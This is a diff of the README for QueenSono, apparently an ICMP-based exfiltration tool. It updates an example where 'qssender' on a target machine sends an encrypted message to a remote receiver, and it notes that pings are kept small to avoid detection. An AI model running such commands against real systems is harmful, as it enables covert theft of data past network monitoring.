@@ -115,7 +115,7 @@ On target machine:
 ### Example 3: Send encrypted data 🔒
 *\> In this example we want to send an encrypted message. As the command line could be spied on we use asymmetric encryption (if the key leaks, it isn't an issue so)*
 
-![demo](https://github.com/ariary/QueenSono/blob/main/img/qssono-encrypted.gif)
+![demo](https://github.com/ariary/QueenSono/blob/main/img/qssono-encryption.gif)
 
 On local machine:
 
@@ -130,8 +130,12 @@ On local machine:
 
 
 On target machine:
+```
+$ export MSG="<your message>"
+$ export KEY="<public_key_from_qsreceiver_output>"
+$ qssender send $MSG -d 1 -l 127.0.0.1 -r 10.0.0.190 -s 5 --key $KEY
+```
 
-    $ qssender send "don't worry this message was encrypted with the public key. only you could decrypt it" -d 1 -l 127.0.0.1 -r 10.0.0.190 -s 5 --key <public_key_from_qsreceiver_output>
 <details>
   <summary>Explanation</summary>
     <li>
@@ -147,12 +151,11 @@ But it comes with a cost. The choice of asymetric encryption is motivated by the
 Another point, as we want to limit data size/ping requests (to avoid detection, bug, etc), **use encryption only if needed** ***as the message output-size will (should) always equal the size of the Modulus*** (part of the key) which is big.
 
 ##### Enhancement
-Currently, the whole message is encrypted and then chunked to be send (often leading to `crypto/rsa: message too long for RSA public key size`)
+Currently, the whole message is encrypted and then chunked to be sent. On the other side we wait for all the packet (chunks), reconstruct our message and then decrypt it.
+But it works ⇔ we have received ALL the chunks, otherwise the decryption will fail.
 
-On the other side we wait for all the packet (chunks), reconstruct our message and then decrypt it. But it works ⇔ we received ALL the chunks, otherwise the decryption will fail.
 
-- We coudl implement a function which will split the message before encryption according to the key length to avoid the size problem 
-- We  could encrypt each chunk, like this we could decrypt them separately
+=> We  could encrypt each chunk accordingly with the `-s` parameter, like this we could decrypt them separately.
 
 
 ### Bonus
